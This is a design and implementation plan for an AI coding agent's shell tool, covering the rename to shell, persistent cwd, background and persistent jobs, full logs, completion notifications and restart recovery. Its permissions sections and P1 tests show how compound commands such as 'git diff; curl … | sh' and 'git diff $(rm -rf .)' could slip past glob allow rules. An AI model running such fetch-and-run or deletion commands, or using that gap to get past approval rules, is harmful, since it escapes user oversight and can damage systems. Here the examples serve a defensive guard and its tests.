# Shell plan: rename `bash` to `shell`; cwd, timeouts, notified jobs, persistent jobs, full logs

Status: **phases P0–P7 are implemented; verified under cited focused test suites (cautious posture: full repo-wide suite verification reserved for parent). P0–P3 verified (98/98 targeted, 335/335 broader); P4 backend (47/47) & Ratatui jobs tab/log viewer verified (152 Python UI, cargo 654 passed / 3 ignored, Ruff passed); P5 completion delivery repaired & verified (289 passed across completion delivery, docs, layering; Ruff passed); P6 persistent jobs verified (33 passed in persistent suite, 106 passed in focused wait/logs/persistent/recovery after fixing stale truncation test expectation, Ruff passed); P7 restart recovery verified (39 passed, Ruff passed)** (written 2026-10-21, revised the same day after a
comparison with OpenCode, section 7; updated with implementation ledger). Sections marked *Current* describe code as it was
when the plan was written; sections under *Proposed* describe the target design as implemented, with remaining known limitations recorded in the ledger.
Where the code and this plan disagree, the code wins ([docs/README.md](../docs/README.md)).

P0-P3 deviations from the text below (see [docs/tools.md](../docs/tools.md#shell-jobs)):
`status`/`wait` keep per-stream `stdout_offset`/`stderr_offset` (the combined `offset` is
only for `log`, and `stdout_offset` is not translated); the combined view replaces the
`stdout:`/`stderr:` rendering only when output is over the limit or a stream's capture was
cut; `log grep` matches literal text, not a regex; the session cwd is a private file next to
the logs, not a `shell.cwd_changed` event; the `cd` permission key uses the path as given;
`!` mode keeps the temp-file spill; the `shell_max_s`/`shell_yield_s` aliases are
implemented, the hourly log sweep and session-delete cleanup are not (retention runs when a
new job starts); glob ask rules and hook matchers also see compound segments.

## 1. Intent

Make the shell tool the dependable way an agent runs work in the workspace:

1. Change the working directory, both per call and as a persistent session cwd.
2. Bound a command with a timeout, without confusing "kill" with "move to background".
3. A long but finite job (test suite, build, migration) that is still running when
   the agent moves on **continues the agent automatically when it finishes**, once,
   with no polling and no duplicate model turn.
4. Run persistent processes (`npm run dev`, a local API, a watcher) that outlive a
   turn, are visible, stoppable, and never wake the model just for running.
5. Large output is truncated in the conversation but **kept in full in a log file**
   (within stated disk bounds that are never exceeded silently).
6. Rename the model-facing tool to `shell`; `bash`/`Bash` keep working as aliases.

### Non-goals

- A sandbox. The permission key is policy matching, not containment
  (`nexus/tools/builtin/bash.py:3-5`); this plan does not change that.
- Interactive programs or a PTY (stdin stays closed). `vim`, `top`, password prompts
  remain unsupported.
- Re-adopting processes across a daemon restart (3.7).
- Background subagents. That flow was removed on purpose
  ([decisions.md](../docs/decisions.md#subagents-are-foreground-only-supersedes-the-background-flow));
  3.5 explains why shell completions are different.
- Web or desktop features, and Windows.

## 2. Current evidence (checked 2026-10-21)

### What exists

| Capability | Where | Notes |
| --- | --- | --- |
| One `bash` tool, `action` = `run`/`status`/`wait`/`stop` | `nexus/tools/builtin/bash.py:75-153` | bundle `shell`, `mutates=True`, `concurrency="exclusive"` |
| Per-call `workdir`, resolved inside the workspace, re-checked right before spawn | `bash.py:226-247`, `bash.py:303-321`, `_jobs.py:295-296` | no persistent cwd; `cd` inside a command does not carry over |
| Shell allow-list `/bin/sh`, `/bin/bash`, `/bin/zsh` | `bash.py:37-45` | |
| `timeout_s` hard kill, capped at `tools.bash_max_s` (3600) | `_jobs.py:1039-1055`, `bash.py:325-352` | `timeout_s` ≤ yield window blocks then kills; above it yields then a watchdog kills |
| Yield to background after `tools.bash_yield_s` (alias `bash_timeout_s`, 120 s) | `bash.py:346-375`, `config/schema.py:781-800` | result says `status: running` + `job_id`; model told to `wait` once |
| `run_in_background` | `bash.py:327-344` | returns `job_id` immediately, still capped at `bash_max_s` |
| Per-session job partitions, opaque ids, no raw PIDs | `_jobs.py:463-651` | |
| Process group (`start_new_session=True`), SIGTERM, 2 s grace, SIGKILL | `_jobs.py:297-306`, `_jobs.py:428-452` | |
| Retention: 32 completed jobs per session, 256 total, 64 MiB of buffers | `_jobs.py:101-112`, `_jobs.py:696-713` | in memory only |
| Shown output ≤ 2,000 lines / 50 KiB, head 40% + tail 60%, rest "saved" to a temp file | `_output_limit.py:1-151` | `$TMPDIR/nexus-output-<uid>/`, newest 200 files kept |
| Throttled `tool.progress` (last line, 1 per 2 s, ≤ 300 per call) | `_jobs.py:115-118`, `bash_output.py:237-253` | not durable |
| Composer `!` mode, durable `shell.started`/`shell.completed`, context added without a turn | `host_support/user_shell.py:1-18`, `session.py:1478-1499` | crash closes an open run as `interrupted` ([sessions.md](../docs/sessions.md)) |
| Legacy names: `Bash` → `bash`; `BashOutput`/`KillShell` rules → `status`/`wait`/`stop` | `tools/names.py:13-36`, `permissions.py:187-220` | call names are canonicalised at dispatch (`tools/manager.py:1124-1138`) |
| Durable input queue with `origin`, request-id dedupe, wake of an idle session | `session.py:1407-1476`, `host/facade.py:773-833` | same request id with different content raises `RequestIdConflict` (`session/db.py:1295-1304`) |
| Automated-origin inputs (subagent reports) skip `UserPromptSubmit`, survive a cancel | `session.py:274-287`, `session.py:1584-1615`, `session.py:1676-1697` | still live code although background subagents are gone |

### Gaps (each is a fact checked in code unless marked *inference*)

1. **The kept output is the head, not the tail.** `OutputBuffer` keeps the first
   1 MiB per stream and discards later bytes (`_jobs.py:137-178`). A test run that
   prints 3 MiB loses its summary. The "full output" spill file is written from that
   captured prefix (`_jobs.py:994`), so it is not the full output either.
2. **stderr hides the stdout summary.** `format_job_output` renders all of stdout,
   then all of stderr, and only then cuts head + tail (`_jobs.py:984-994`). A run
   with a few warnings on stderr shows those warnings as the "tail" and can cut the
   stdout summary out of the shown text.
3. **Spill files are not a log.** A new file is written on every `status`/`wait`
   that is over the limit (`_jobs.py:994`, `_output_limit.py:83-91`); one global
   200-file prune in `$TMPDIR` runs across all sessions and projects
   (`_output_limit.py:68-86`), so a named path can disappear within minutes.
4. **No completion notification.** A yielded job is only seen if the model calls
   `wait`, which blocks the turn and, because `bash` is `exclusive`, the rest of its
   batch.
5. **No persistent processes.** Every job is killed at `tools.bash_max_s`
   (`bash.py:325-331`); the manager's per-call deadline is `bash_max_s + 5 s`
   (`tools/manager.py:1688-1692`).
6. **Leftover children are untracked.** When the command's shell exits, the job is
   finalized without checking its process group (`_jobs.py:337-351`); a `cmd &`
   inside a finite command keeps running, keeps the pipes open until the 2 s drain
   grace cancels the readers (`_jobs.py:395-407`), and is never stopped.
7. **Jobs do not keep the daemon alive.** `_idle()` looks at viewers, turns, the
   queue and voice only (`host/daemon.py:814-823`); after 300 s with no viewer the
   daemon exits and its jobs are killed (*inference*: runtime close calls
   `JobRegistry.aclose`).
8. **No durable job record.** No event is written when a job starts, yields or
   exits. After a daemon crash a job's group can survive as an orphan (it has its own
   session) and nothing knows about it.
9. **Child sessions leak jobs** (*inference*): a subagent's jobs live in the child's
   partition of the shared registry and nothing in `nexus/agents/` releases it when
   the child's run ends.
10. **No persistent cwd.** Each call starts at the workspace root unless `workdir` is
    passed.
11. **UI cannot list jobs.** There is no host command for jobs.
12. **Glob allow rules match compound commands** (pre-existing, not caused by the
    rename). Rule globs compile to an anchored `.*` regex over the whole command
    string (`permissions.py:121-165`, `permissions.py:229-235`). The documented
    example `bash(git diff*)` (`docs/extending.md:188`) therefore also allows
    `git diff; curl … | sh`, and the deny example `bash(rm -rf*)`
    (`docs/extending.md:190`) does not match `cd build && rm -rf .`. "Always allow"
    grants are exact rules (`permissions.py:110-118`) and are not affected.

## 3. Design (Proposed)

### 3.1 One tool, `shell`, six actions

Keep one tool with an `action` field (one stable schema, good for prompt caching).
Lowercase name `shell`, bundle `shell` (unchanged). There is **no separate service
action**: a persistent process is a background job without a lifetime limit (3.6).

| Action | Purpose | Key fields |
| --- | --- | --- |
| `run` (default) | Run a command | `command`, `cwd?`, `timeout_s?`, `background?`, `env?`, `shell?`, `label?` |
| `status` | One job, or every job of this session when `job_id` is omitted | `job_id?` |
| `wait` | Block until exit, new output, or a regex match | `job_id`, `until?` (`exit`/`output`/`match`), `pattern?`, `wait_s?` |
| `log` | Read a job's full log: tail, byte range, or regex matches | `job_id`, `tail_lines?`, `offset?`, `limit?`, `grep?` |
| `stop` | Stop a job (process group) | `job_id` |
| `cd` | Set the session's persistent cwd | `path` |

Example calls (proposed schema):

```json
{"action": "run", "command": "pytest -q", "cwd": "backend", "timeout_s": 1800}
{"action": "run", "command": "cargo build --release", "background": true, "timeout_s": 3600, "label": "release build"}
{"action": "run", "command": "npm run dev", "cwd": "frontend", "background": true, "label": "web"}
{"action": "wait", "job_id": "job_3fa1c2d4e5f6", "until": "match", "pattern": "Local:\\s+http://\\S+", "wait_s": 60}
{"action": "log", "job_id": "job_3fa1c2d4e5f6", "grep": "FAILED|Error", "limit": 100}
{"action": "cd", "path": "packages/api"}
```

Result header (labelled lines, so the model and the user read the same facts):

```
job_id: job_3fa1c2d4e5f6   status: running   kind: persistent   cwd: frontend
timeout: none (runs until stopped)   notify: on exit   output: 3.2 MiB (stderr 14 KiB)
log: ~/.nexus/projects/<key>/shell/<session>/job_3fa1c2d4e5f6.log
```

Bounds: `command` ≤ 16,000 chars (as `!` mode, `user_shell.py:35`), `label` ≤ 120,
`pattern`/`grep` ≤ 256 chars and run in the existing killable regex worker
(`tools.grep_timeout_s`, `config/schema.py:791`), `tail_lines`/`limit` always under
the 50 KiB shown-output limit. Validation stays action-specific (`bash.py:168-223`):
fields that do not belong to the action are an error. `stdout_offset`/`stderr_offset`
are replaced by one `offset` into the combined log (3.4); legacy calls translate
`stdout_offset` → `offset` and reject `stderr_offset` with a message.

### 3.2 Working directory

Recommendation: **a tracked session cwd, not a long-lived shell process.** A
persistent shell would also carry `export`s and aliases, but it makes every
command's effect depend on invisible state, breaks per-command process-group kill,
and a hung command wedges the session. A tracked cwd is one visible, durable value.

- Resolution for each spawn: `cwd` argument → session cwd → workspace root. Relative
  `cwd` resolves against the **session cwd**; absolute must be inside the workspace.
  Same checks as today (`bash.py:226-247`) and the same re-check right before spawn
  (`_jobs.py:295-296`).
- `cd` resolves the same way, then appends durable `shell.cwd_changed {cwd,
  previous}`. The session cwd is rebuilt from the log on open. A cwd that later
  disappears makes the next spawn fail with an error naming it and the reset
  (`cd .`); no silent fallback.
- `cd foo && make` inside a command does **not** change the session cwd; the
  description says so and tells the model to prefer `cwd` over `cd` in commands.
- The cwd is in every job result header, on the tool row, and on the approval
  prompt; it is **not** added to the system prompt (cache stability).
- `!` mode keeps running at the workspace root. *Open decision Q1.*
- Subagents start at their own workspace (or worktree) root. The parent can name a
  directory in the prompt. Copying and remapping the parent cwd into a worktree was
  dropped as complexity without a clear need.

### 3.3 Timeout, yield, background

| Term | Meaning | Default |
| --- | --- | --- |
| `timeout_s` | hard limit: the group is killed, status `timed_out`, wherever the job is | foreground: `tools.shell_max_s` (3600); `background: true`: **none** |
| yield window | how long a foreground `run` blocks before it becomes a background job | `tools.shell_yield_s` (120) |
| `background: true` | detach immediately | false |

- Foreground keeps today's rules (`bash.py:346-375`): `timeout_s` ≤ yield window
  blocks then kills; otherwise it yields at the window and the watchdog still
  enforces `timeout_s`/`shell_max_s`. A yielded job stays finite.
- `background: true` with `timeout_s` is a finite background job. Without
  `timeout_s` it is a **persistent** job (3.6). This is the only way to get a job
  with no lifetime limit, and it is shown as `kind: persistent` everywhere.
- Every yielded or background job notifies on exit (3.5); there is no `notify`
  flag. A model that wants the result now uses `wait`.
- Turn cancel (Stop) kills a **foreground** job, as today. Background jobs survive a
  turn cancel; auto-continuation pauses (3.5).
- `wait` caps: `until=exit` ≤ the job's remaining lifetime, and ≤ 600 s for a
  persistent job; `until=output`/`match` ≤ 120 s. The manager deadline for a `shell`
  call becomes "the action's own bound + 5 s" instead of `bash_max_s + 5 s`
  (`tools/manager.py:1690-1691`).
- **User "move to background"** (adopted from OpenCode, 7): a TUI action yields the
  running foreground job now, through the existing yield path, and the tool result
  says the user moved it.
- **Leftover children of finite jobs:** when the command's shell exits and its group
  still has members (`killpg(pgid, 0)` succeeds), the group is terminated with the
  normal grace and the result says "processes left running by the command were
  stopped; use background: true for long-running processes". This fixes gap 6 and
  the drain wait. Persistent jobs are exempt: their group lives until `stop`.

### 3.4 Output: one combined log per job

Recommendation: **the daemon tees both pipes, in arrival order, into one log file
per job; memory keeps only a head and a tail of that combined stream.** Arrival order
is what a terminal shows and puts the real last lines last (fixes gap 2). Per-stream
byte counts are kept; the stream split itself is not, and nothing in the views
depends on it today (the only `stderr:` rendering is `_jobs.py:988`).

Layout (machine state, under the project directory from `config/paths.py:52`):

```
~/.nexus/projects/<project-key>/shell/<session_id>/<job_id>.log
```

Directories `0700`, files `0600`. No sidecar metadata file: the durable job events
(3.7) hold command, cwd, status and byte counts, and the path is derived from
`(session, job_id)`.

- **Drain path:** each chunk is appended to the log (buffered, flushed at least every
  1 s and at exit), to a head buffer (first 64 KiB) and to a tail ring (last
  256 KiB). This replaces the prefix-only `OutputBuffer` (`_jobs.py:137-178`).
  Offsets are byte offsets in the log, monotonic, and the same for `log` and the
  per-job read cursor. Newlines are counted while streaming so notices can say
  "lines X-Y of N" without rescanning the file.
- **Shown output:** the contract (≤ 2,000 lines / 50 KiB, head 40% + tail 60%,
  `_output_limit.py:28-35`) is unchanged but cut from the head and tail buffers of
  the real stream. The notice names the log path and the action:
  `[showing lines 1-800 and 41,201-42,400 of 42,400 (3.2 MiB); full log: <path>; use shell action=log job_id=…]`.
  The `$TMPDIR` spill is no longer used by `shell` or `!` mode (`!` already runs
  through the registry, `user_shell.py:5-8`). Other tools keep `_output_limit`
  spills as today.
- **`log` action:** tail, byte range or regex matches from the file, never more than
  the shown-output limit per call, and says which range it returned and what is
  left. It needs no `read` permission: like `status`, it is scoped to the session's
  own job ids. The path is still printed, so the user (and a model with `read`
  access) can open it directly.
- **Disk bounds, never silent:**

  | Bound | Default | When hit |
  | --- | --- | --- |
  | `tools.shell_log_max_bytes` per job | 512 MiB (`0` = unlimited) | stop writing; keep counting; the tail ring still holds the end; every result and the exit event say `log truncated at 512 MiB; N bytes not saved` |
  | `tools.shell_log_total_bytes` per project | 2 GiB | at spawn and at daemon start, delete whole logs of finished jobs, oldest first; running jobs are never deleted |
  | `tools.shell_log_retention_days` | 7 | finished logs older than this are deleted at daemon start and hourly |
  | session delete / trash purge | | its log directory is deleted with it |

  A write error (`ENOSPC`, `EIO`) stops logging for that job with a notice; it
  never kills the job. A `log` call for a job whose file is gone answers "log no
  longer available (retention or deletion)", which the durable exit event lets it
  distinguish from "unknown job".
- **Memory:** today's completed-job limits (`_jobs.py:101-112`) stay; eviction from
  memory no longer loses output because the file remains.

Dropped from the first draft as unneeded: per-stream files, a `meta.json` per job,
retention tombstones, rolling 16 MiB service segments, and a free-disk pre-check.

### 3.5 Completion delivery: background jobs continue the agent

Why this is not the background-subagent mistake again: subagent reports were a
second delivery path for work that could have stayed inside the call, and models
polled, re-spawned, or forgot children
([decisions.md](../docs/decisions.md#subagents-are-foreground-only-supersedes-the-background-flow)).
A 40-minute build is longer than any sensible blocking call, and a dev server cannot
block at all. Delivery is kept small: one message per job, through the queue that
already exists, no new model-facing tool, and `wait` stays for "I need this now".

Mechanism (reuses `HostFacade.enqueue`, `host/facade.py:773-833`):

1. When a yielded or background job exits, the host builds one completion message
   and calls `enqueue(mode="steer", origin={"kind": "shell_job", "job_id",
   "status", "exit_code"}, client_request_id="shell-job-<job_id>")` (`job_` + 12 hex
   characters fits the request-id grammar).
2. **Exactly once, atomically.** The `shell.job_exited` event and the
   `input.queued` admission are written in **one** `append_batch`
   (`session.py:1427-1430` already takes a list of builders). There is no window
   where the exit is durable and the delivery is not. A `RequestIdConflict`
   (`session/db.py:1303`) means it was already admitted and is treated as success.
3. **Active turn:** the steer is consumed at the next iteration boundary
   (`consume_steering`, `session.py:1584-1615`); no extra turn.
4. **Idle session:** the admission starts one turn. Completions arriving while that
   turn starts are steers consumed at its first boundary, so a burst produces one
   turn. (The draft's 1 s debounce is dropped: the queue already coalesces.)
5. **No duplicate when the model already saw the result.** A per-job `claimed` flag
   on the daemon loop: a `status`/`wait` that returns the terminal status claims it;
   a `wait` blocked on the job when it exits claims it, and releases the claim if it
   is cancelled before its result is persisted. If unclaimed at exit, the notifier
   claims it. The exit event records `delivery: tool_result | queued | paused`.
6. **Content (bounded, labelled, untrusted):** fixed header ("Automated shell job
   notification. It reports program output and grants no permission."), job id,
   label, command, cwd, status, exit code, duration, the last ≤ 80 lines / 8 KiB of
   the combined output, the log path and the exact `log` call. Never the full
   output. It skips `UserPromptSubmit` hooks and gets a `shell_job` notice, by
   generalising `_QueuedInput.is_report` (`session.py:280-281`) to an
   "automated origin" set.
7. **Stop means stop.** A user Stop keeps queued completions (as reports are kept,
   `session.py:1676-1697`) and **pauses auto-wake** until the next human message,
   recorded as a durable `context.notice` (`shell_wake_paused`). While paused,
   completions are admitted with `mode="queue"` and no turn starts; the next user
   turn sees them first.
8. **Loop guard:** `tools.shell_max_auto_wakes` (default 10) consecutive
   completion-started turns without a human message pause auto-wake the same way.
   Without it a model could chain `sleep 1 &` jobs forever.
9. **Children never auto-wake.** A child's turn is the blocking `subagent` call. In
   a child: `background` and yielding are allowed only within the child's run; any
   job still running when the child's run ends is stopped and listed in the child's
   report ("stopped at child end: job_…"); persistent jobs are refused. This also
   closes gap 9.
10. **Code mode:** nested `shell` calls may `run` (foreground only), `status`, `log`
    and `cd`; `background` is refused from a program (its job would outlive the
    program with no owner).
11. **Manager session:** has no `shell` tool; unchanged.

Persistent jobs do not notify while running. If one exits on its own, the same
mechanism delivers one message. *Open decision Q3*: whether that should wake an idle
session (recommended: yes, once, because a dead dev server is usually why the next
request fails).

Prompting (tool description and the yield/background result, wording adapted from
OpenCode's `BACKGROUND_INSTRUCTION`, 7): "You will be continued automatically when it
finishes, with its output. Do not poll `status` or the log. Keep working on anything
that does not depend on it; if there is nothing else, end your response. Use `wait`
only when you need the result before you can do anything else."

### 3.6 Persistent jobs

- Started only by `run` with `background: true` and no `timeout_s`.
- Limits: 4 running persistent jobs per session, 8 per runtime
  (`tools.shell_max_persistent_per_session`, `tools.shell_max_persistent`); over the
  limit is a model-visible error listing the running ones and how to stop them.
- **Duplicate hint:** starting a persistent job whose command and cwd equal a
  running one in the same session returns an error naming that `job_id`; the model
  can `stop` it first. This replaces the draft's unique `name` field.
- **Readiness:** `wait until=match pattern=…` matches complete lines of new output
  with ANSI escapes stripped (dev servers colour their banner), carrying a partial
  line across chunk boundaries, ≤ 120 s. On timeout the job keeps running and the
  result shows the tail. The draft's TCP port probe is dropped: the port is often
  unknown or changes when busy, and `localhost` may bind only `::1`, so a
  `127.0.0.1` probe gives false negatives (*inference*, not tested here).
- **Daemon lifetime:** running jobs keep the daemon from idle shutdown (extend
  `host/daemon.py:814-823`). To bound forgotten processes, after
  `tools.shell_orphan_s` (default 3600 s) with no viewer and no turn, the daemon
  stops persistent jobs and exits, recording `stopped: no viewer for 1 h`.
  Auto-archive skips sessions with running jobs (`SessionManager.archive_stale`),
  and session close goes through `Runtime.aclose_session` so jobs are released.
- `nexus daemon status` lists running persistent jobs; `nexus daemon stop` stops them.

### 3.7 Process groups, durable events, daemon restart

- Kill semantics unchanged: SIGTERM the group, 2 s grace, SIGKILL, reap
  (`_jobs.py:428-452`). Known limit: a process that calls `setsid` itself (the
  `setsid` utility, daemonising servers, `docker compose up -d`) leaves the group and
  is not tracked. `nohup` alone does not leave the group. The description tells the
  model not to daemonise and to use `background: true` instead.
- **Durable job events** (session-scoped): `shell.job_started {job_id, kind,
  label?, command, cwd, shell, timeout_s, call_id, turn_id}`, `shell.job_yielded
  {job_id, after_s, by: "timer" | "user"}`, `shell.job_exited {job_id, status,
  exit_code, signal, duration_ms, bytes, stderr_bytes, log_truncated, delivery}`,
  `shell.cwd_changed`. Output bytes never go into events.
- **No re-adoption, no automatic restart after a daemon restart.** The pipes die with
  the daemon, PIDs can be reused, and restarting would execute a command again
  without the approval it was given for one start.
- **Recovery:** the daemon keeps `~/.nexus/projects/<key>/shell/active.json` (atomic
  rewrite on start/exit: session, job id, pgid, process start time, daemon pid). At
  daemon start, for each entry whose daemon pid is dead: if the group leader is alive
  **and** its start time matches (PID-reuse guard), the group is terminated. Start
  time comes from `ps -o lstart= -p <pid>` (no `psutil` dependency today). On the
  next open of the session, under the session lock, recovery appends
  `shell.job_exited {status: "interrupted"}` for every started job with no exit,
  like the `!` recovery ([sessions.md](../docs/sessions.md)).
- Interrupted jobs are reported as a **non-waking** context note
  (`add_context`, `session.py:1478-1493`): a restart is often the user's own action.
  OpenCode makes the same choice (7).

### 3.8 Permissions and security

- **Permission keys** (grammar unchanged):

  | Action | Key | Default |
  | --- | --- | --- |
  | `run` | the command string (as today) | rules/mode, as today |
  | `cd` | `cd:<resolved absolute path>` | allowed without asking inside the workspace; `deny` rules still apply |
  | `status`, `wait`, `log` | `<action>:<job_id>` | allowed without asking (own session only) *Open decision Q2* |
  | `stop` | `stop:<job_id>` | rules/mode, as today |

  A `shell(npm run dev)` rule covers foreground, finite background and persistent
  runs of that command, as `run_in_background` already does. The approval prompt's
  **What happens** row must say which: "runs until stopped and continues you if it
  exits", "runs in the background (limit 1 h) and continues you when done", plus
  the effective cwd (now possibly from `cd`, so not visible in the command).
- **Compound commands (gap 12), *Open decision Q5*.** Recommendation: a **glob**
  allow rule auto-allows only a command with no unquoted control syntax (`;`, `&`,
  `&&`, `||`, `|`, newline, `` ` ``, `$(`, `<(`, `>(`); otherwise the user is asked.
  Glob **deny** rules are also tested against each segment split on those
  operators. Exact rules and exact grants are unchanged. Splitting uses `shlex` with
  punctuation characters; a parse failure is treated as compound (ask). This
  tightens, never widens. It is independent of the rename and can ship first.
  OpenCode's tree-sitter parser and 140-entry arity table (7) are not adopted.
- Session isolation stays structural: lookups by `(session_id, job_id)` only.
- Environment: never written to logs, events or results (`_jobs.py:290-294`); `env`
  overlays stay per job.
- Logs are private (`0700`/`0600`), may hold secrets the program printed, and live
  under `~/.nexus/projects/`, never the workspace. Add `shell` to the Settings
  agent's blocked path parts (`permissions.py:927-952`).
- Completion messages are data: fixed trust header, no `UserPromptSubmit`.
- Read-only roles stay structurally denied the `shell` bundle
  (`agents/model.py:219-226`); add `shell` to `SHELL_TOOLS`.
- Persistent jobs bind ports with the user's privileges; say so in
  [security.md](../docs/security.md).

### 3.9 Native TUI (host-mediated)

Clients never run or signal processes; everything goes through host commands, as
`SessionShell` does today ([host.md](../docs/host.md)).

- Host commands: `SessionJobs(session)` (bounded list: id, kind, label, status, cwd,
  started, duration, exit, bytes, log truncated, delivery), `SessionJobLog(session,
  job_id, offset?, limit?, tail_lines?)`, `SessionJobStop(session, job_id)` and
  `SessionJobBackground(session, job_id)` (user actions, no permission, as `!` mode).
  All are session scoped and refuse other sessions.
- Ratatui: a jobs strip in the sidebar ("2 running · web persistent"), a jobs panel
  with labelled fields, a log viewer that pages `SessionJobLog` (follow mode
  re-requests the tail), Stop and "Background" on a row. The `shell` tool row shows
  action, command, cwd, timeout, background, job id and log path as labelled rows
  ([surfaces.md](../docs/surfaces.md)). A delivered completion renders as an
  origin-labelled row, like subagent reports (`ui/ratatui/prototype.py:380-426`).
- Live output stays the non-durable `tool.progress` line; a reopened session shows
  durable job events plus log paging.
- Native TUI only. No new web or desktop features; legacy name recognition in
  existing web rendering (3.10) is for compatibility only.

### 3.10 Rename and migration

| Surface | Change |
| --- | --- |
| Tool name | `bash` → `shell` (`tools/builtin/bash.py` → `shell.py`; `bash.py` kept as a re-export shim for one release) |
| Call aliases | `canonical_tool_name`: `Bash`/`bash` → `shell` (`tools/names.py:13-27`). For calls arriving as `bash`/`Bash`, translate `workdir` → `cwd`, `run_in_background` → `background`, `stdout_offset` → `offset` before validation, and nothing else. A legacy `run_in_background` call without `timeout_s` keeps today's `bash_max_s` cap (it is never silently made persistent) |
| Permission rules and grants | `bash(...)`/`Bash(...)` → `shell(...)` by the existing one-way rule translation; persisted `*_always` grants go through the same translation. `BashOutput`/`KillShell` keep mapping to `status`/`wait` and `stop` only (`permissions.py:187-220`) |
| Hook matchers | matchers are permission rules (`hooks/manager.py:184-191`), so `Bash`/`bash` matchers follow the translation. Test it |
| Role files, skills | `tools: [bash]` canonicalised by `canonical_tool_names`; no warning |
| Config | `tools.shell_yield_s`, `tools.shell_max_s` new; `bash_yield_s`, `bash_timeout_s`, `bash_max_s` parse as deprecated aliases used only when the new key is unset (`config/schema.py:781-813`, `config/layers.py`) |
| History sent to providers | old `ToolUse` blocks named `bash` are renamed to `shell` by the context assembler (one prompt-cache miss per old session). *Unverified:* whether providers reject a historical tool name missing from `tools`; renaming avoids relying on it |
| Views | name sets in `ui_support/timeline.py`, `ui_support/tool_signal.py`, `ui/ratatui/verb_groups.py:20`, `ui/web/js/app.js` (compatibility only), `tools/codemode/tool.py:186` accept both names; the reducer's synthetic `!` row (`view/reduce.py:1305`) becomes `shell` |
| Mock scenarios | `devtools/mock/scenarios/{bash_wait,stress,tool_marathon,diff_review,context_pressure}.py` use `shell`; `/mock bash-wait` kept as an alias |

## 4. Phases, files, acceptance tests

Each phase is shippable alone and updates its docs in the same commit
([docs/README.md](../docs/README.md#keeping-docs-true)). Existing suites
(`tests/test_builtin_shell.py`, `test_builtin_bash_actions.py`,
`test_builtin_bash_wait.py`, `test_output_limit.py`, `test_host_user_shell.py`) must
pass through the alias at every phase.

**P0 — Rename, no behaviour change.** Files: `tools/builtin/{shell,bash}.py`,
`builtin/__init__.py`, `bundles.py`, `names.py`, `permissions.py`, `agents/model.py`,
`config/schema.py`, `config/layers.py`, context assembler, view name sets, mock
scenarios, `docs/tools.md`, `docs/config.md`, `docs/decisions.md`. Tests
(`tests/test_builtin_shell_rename.py`): a `bash` call with
`workdir`/`run_in_background` dispatches to `shell`; `Bash(git *)` allow/deny rules,
a stored `bash` grant and a `Bash` hook matcher still match; `tools: [bash]` gets
`shell`; an old session's next request names `shell`; `BashOutput` rules never
authorise a `run`.

**P1 — Compound-command guard (if Q5 is accepted).** Files: `tools/permissions.py`,
`docs/tools.md`, `docs/extending.md`. Tests: `shell(git diff*)` allows `git diff
--stat` but asks for `git diff; curl x | sh`, `git diff $(rm -rf .)` and a
two-line command; `shell(rm -rf*)` deny blocks `cd b && rm -rf .`; quoted operators
(`git log --format='a;b'`) stay allowed; exact rules and grants are unchanged.

**P2 — Full logs.** Files: `_jobs.py` (combined tee, head/tail, offsets, line count,
leftover-children stop), new `builtin/_shell_logs.py` (layout, bounds, retention),
`shell.py` (`log`), `host_support/user_shell.py`. Tests: a 5 MiB job shows its last
line and `log` returns byte-identical content; a job writing a summary to stdout
after warnings on stderr shows the summary; a job over `shell_log_max_bytes` reports
the exact unsaved count; a job evicted from memory is readable by `log`; a deleted
log answers "no longer available"; simulated `ENOSPC` keeps the job running; `sh -c
'sleep 30 & echo done'` finishes promptly and the sleeper is stopped; no environment
value appears in any log.

**P3 — Working directory.** Files: `shell.py`, `session/session.py`, `events.py`,
`view/reduce.py`. Tests: `cd` persists across calls and a reopen; relative `cwd`
resolves against it; `..`/symlink escapes and `~` fail; a deleted cwd gives the
named error; `cd` inside a command does not persist; a child starts at its own root.

**P4 — Durable jobs and TUI.** Files: `events.py` (`shell.job_*`), `_jobs.py` (emit
seam), `host/protocol.py`, `host/facade.py` (four job commands), `host/daemon.py`
(idle check), `session/manager.py`, `host_support/session_archive.py`,
`ui_support/tool_details.py`, `ui/ratatui/sidebar.py`, `rust/tui/`. Tests: replay
equals live; `SessionJobs` of A never shows B; the daemon does not idle-exit with a
running job; auto-archive skips a session with one; `SessionJobBackground` yields a
foreground job and the tool result says so; a job that finishes in the same tick as
it is backgrounded reports its exit exactly once (OpenCode covers this race in
`packages/core/test/tool-shell.test.ts` "persists a silent command that finishes
before backgrounding"); Ratatui snapshots.

**P5 — Completion delivery.** Files: `host/facade.py` (notifier),
`session/session.py` (automated-origin set, wake pause, atomic exit + admission),
`shell.py` (claim), `agents/runner.py` (child rules), `tools/codemode/`, role bodies
`agents/data/{build,orchestrator}.md`. Tests
(`tests/test_shell_completion_delivery.py`, `ScriptedProvider`): idle → exactly one
turn; active turn → consumed at the next boundary, no extra turn; three jobs
finishing together → one turn; a `wait` that returned the exit → no delivery; a
cancelled `wait` → the job keeps running and is delivered; Stop → nothing wakes
until the next user message, which sees the completion first; 10 consecutive wakes →
paused notice; a crash between exit and admission is impossible (single batch) and a
repeat admission returns the same queued id; a child's job running at child end is
stopped and listed.

**P6 — Persistent jobs.** Files: `shell.py` (persistent kind, `until=match`,
duplicate hint), `_jobs.py` (no lifetime cap, limits), `tools/manager.py`
(per-action deadline), `host/daemon.py` (orphan policy, `daemon status`), `cli.py`.
Tests: a job printing a coloured ready banner matches; a split-chunk banner matches;
match timeout keeps it running; the fifth persistent job is refused with the list;
the same command twice is an error that names the first id (reconciled with 3.6: an
error whose first line is `job_id: <running id>`; nothing new is started); it survives turn end and cancel; `stop`
kills the whole group; an unexpected exit delivers once; the no-viewer timeout stops
it and records why; a legacy `run_in_background` call is still capped;
`/mock shell-persistent`.

**P7 — Restart recovery.** Files: `builtin/_shell_logs.py` (`active.json`),
`host/daemon.py` (startup sweep), `session/session.py` (recovery events). Tests
(extend `tests/test_host_daemon_crash.py`): after `kill -9` of the daemon the orphan
group is killed at next start; a reused PID with a different start time is not; the
session gets `shell.job_exited(interrupted)` once across two reopens; no turn starts
from recovery.

## 5. Acceptance criteria

- `shell` is the only model-facing shell tool; every historical `bash` spelling,
  rule, grant and hook matcher keeps its meaning and never widens.
- A job's full output up to the stated bounds is retrievable after the turn, after
  memory eviction, and after a daemon restart; any byte not kept is counted and
  reported.
- A background job produces exactly one model-visible completion (tool result or
  notification), never zero while auto-wake is enabled, never two.
- Persistent jobs run without a lifetime limit, report readiness via `wait`, survive
  turns, are listed in the TUI, and stop with their process group.
- After a daemon crash no tracked process group outlives the next daemon start.
- No client runs or signals a process; the TUI shows every job field the model sees.

## 6. Risks and open decisions

